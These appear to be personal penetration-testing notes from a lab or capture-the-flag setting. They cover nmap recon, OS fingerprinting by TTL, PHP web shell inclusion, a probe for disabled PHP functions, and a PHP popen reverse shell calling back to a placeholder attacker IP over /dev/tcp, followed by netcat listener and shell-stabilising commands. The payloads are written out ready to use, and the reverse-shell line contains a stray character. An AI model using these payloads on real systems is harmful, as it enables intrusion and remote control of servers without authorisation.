### Procedures

#### Recon

##### NMAP

``` nmap -sC -sV -A -Pn -oA nmap/<fileOutput> <ipOrDomain> ```


##### VHOSTS - Domains
Add any domains found to /etc/hosts

##### Confirm target OS
Confirm target OS with ping /dcpdump and TTL and correlate with nmap discovery banner

* Linux/MAC OS – 64
* Windows – 128
* Cisco Routers – 255
* DNS – depends on the DNS resolver (can range from 128 to 86400)

```
ping 10.129.181.116
PING 10.129.181.116 (10.129.181.116) 56(84) bytes of data.
64 bytes from 10.129.181.116: icmp_seq=1 ttl=63 time=7.63 ms
64 bytes from 10.129.181.116: icmp_seq=2 ttl=63 time=7.78 ms
64 bytes from 10.129.181.116: icmp_seq=3 ttl=63 time=7.76 ms
```

So this confirms the TTL 63 so Linux box

You can also use tcpdump as follows:

``` 
tcpdump -i tun0 -v -n ip src 10.129.181.116
```
then on another shell drop netat to 22 for example

```
nc -zv 10.129.181.116 22
```

And you should be able to only see the packets as follows below ```ttl 63```

```
root@cloud1:/opt/repos# tcpdump -i tun0 -v -n ip src 10.129.181.116
tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
11:05:26.008219 IP (tos 0x0, ttl 63, id 0, offset 0, flags [DF], proto TCP (6), length 60)
    10.129.181.116.22 > 10.10.15.41.46576: Flags [S.], cksum 0x9708 (correct), seq 1050554249, ack 1765552463, win 65160, options [mss 1357,sackOK,TS val 2162116772 ecr 2221788402,nop,wscale 7], length 0
11:05:26.019534 IP (tos 0x0, ttl 63, id 32497, offset 0, flags [DF], proto TCP (6), length 52)
    10.129.181.116.22 > 10.10.15.41.46576: Flags [.], cksum 0xc1e3 (correct), ack 2, win 510, options [nop,nop,TS val 2162116784 ecr 2221788410], length 0
11:05:26.073981 IP (tos 0x0, ttl 63, id 32498, offset 0, flags [DF], proto TCP (6), length 93)
    10.129.181.116.22 > 10.10.15.41.46576: Flags [P.], cksum 0x9d54 (correct), seq 1:42, ack 2, win 510, options [nop,nop,TS val 2162116838 ecr 2221788410], length 41
11:05:26.074296 IP (tos 0x0, ttl 63, id 32499, offset 0, flags [DF], proto TCP (6), length 52)
    10.129.181.116.22 > 10.10.15.41.46576: Flags [F.], cksum 0xc182 (correct), seq 42, ack 2, win 510, options [nop,nop,TS val 2162116839 ecr 2221788410], length 0
```

##### Interesting Tools
OSINT (Open Source Intelligence Tools)

- GitTools - https://github.com/internetwache/GitTools
-------------------------

##### Manual Inclusion of Php Shell
```
<?php system("whoami"); ?>
```

phpinfo allows us check if system / popen and other mods are disabled
```
<?php phpinfo(); ?>
```

if so dfunction bypass so we create a nice php file which we include in a request to map what we can do as followws

##### Creation of dangerous.php

```
<?php 
$dangerous_functions = array('popen','system');

foreach($dangerous_functions as $f) {
    if (function_exists($f)) {
        echo $f . " exists<br>\n";
    }
}
```

So output came with popen as a nice possibility

so ... as a reference here is php popen manual :D --> https://www.php.net/manual/en/function.popen.php
so we did some mods :D as follows below

```
<?php
error_reporting(E_ALL);

/* Add redirection so we can get stderr. */
$handle = popen('bash -c "bash -i > & /dev/tcp/<OUR_IP>/<OUR_PORT> 0>&1"'>, 'r');

/* example $handle = popen('bash -c "bash -i > & /dev/tcp/127.0.0.1/9001 0>&1"'>, 'r'); */

echo "'handle'; " . gettype($handle) . "\n";
$read = fread($handle, 2096);
echo $read;
pclose($handle);

?>
```

This PHP script is attempting to establish a reverse shell connection to a specified IP address and port using the popen() function, which opens a pipe to a process started by the given command. Here's a breakdown of the script:

Here's what the script does:

It sets the error reporting level to report all PHP errors.
It uses popen() to execute a Bash command. This command attempts to establish a reverse shell connection to <OUR_IP> on <OUR_PORT>. <OUR_IP> and <OUR_PORT> should be replaced with the attacker's IP address and listening port, respectively.
It outputs the type of the $handle variable, which is a resource returned by popen().
It reads up to 2096 bytes of output from the command execution using fread() and echoes it.
Finally, it closes the pipe to the process using pclose().
It's important to note that executing shell commands from within PHP can be dangerous, especially if user input is involved, as it can lead to security vulnerabilities such as command injection. Additionally, the use of reverse shells for unauthorized access to systems is unethical and likely illegal.

we start our server that will reverse the shell using netcat as follows:

``` nc -lvnp 9001 ```

This command listens (`-l`) on port 9001 (`-p 9001`) for incoming connections (`-n` option disables DNS resolution) using the netcat (`nc`) utility in listening mode (`-l`). 

- `-v`: Enables verbose mode, which provides more detailed output.
- `-n`: Suppresses DNS resolution for IP addresses, which can speed up connection establishment.
- `-p 9001`: Specifies the port number (9001 in this case) on which to listen for incoming connections.

So, when you run this command, your system will start listening for incoming TCP connections on port 9001. This is often used in scenarios where you want to set up a simple network server for testing or other purposes.

when we have the server listening on this shell we send the request with our crafted shell and load it

we should have droped to the shell on target server on the nc shell

when the target server shell is spawned, we might want to :

``` python3 -c 'import pty;pty.spawn("/bin/bash")' ```

then

``` stty raw -echo;fg ```

This Python command invokes an interactive Bash shell from within a Python session. Let me break it down for you:

- `python3`: This is the command to invoke the Python interpreter. It indicates that the following code should be executed using Python 3.

- `-c`: This flag tells Python to execute the following string as a command.

- `'import pty;pty.spawn("/bin/bash")'`: This is the Python code to be executed. It first imports the `pty` module, which stands for "pseudo terminal utilities". Then it uses the `spawn` function from the `pty` module to spawn a new process running `/bin/bash`, which is the Bash shell.

So, when you run this command, it effectively starts a new interactive Bash shell within your current terminal session, allowing you to execute commands as if you were using a regular Bash shell.

This command performs two operations:

1. `stty raw -echo`: This command configures the terminal to operate in "raw" mode and disables echoing. In raw mode, input is passed directly to the application without any interpretation or line buffering by the terminal driver. Disabling echoing means that characters typed by the user will not be displayed on the screen.

2. `fg`: This command brings the most recently suspended job into the foreground. If no job is specified, it brings the current job into the foreground. This is typically used to resume a suspended process.

So, when you execute this command, it configures the terminal to operate in raw mode without echoing, and then brings the most recently suspended job (if any) into the foreground. This is often used in combination with the Python command (`import pty;pty.spawn("/bin/bash")`) to enhance the interactivity and usability of the spawned Bash shell.

then as final step 

```export TERM=xterm```

Setting `TERM=xterm` is used to define the terminal type or emulation. The `TERM` environment variable specifies the type of terminal that the shell should emulate. 

In this case, `xterm` is a widely supported terminal emulation, often used in Unix-like operating systems. Setting `TERM=xterm` tells programs running in the shell to use the characteristics of the xterm terminal emulator.

This setting can be useful for ensuring compatibility with programs that rely on specific terminal features or behaviors. It's commonly used when interacting with remote systems or when running terminal-based applications that require a particular terminal type to function correctly.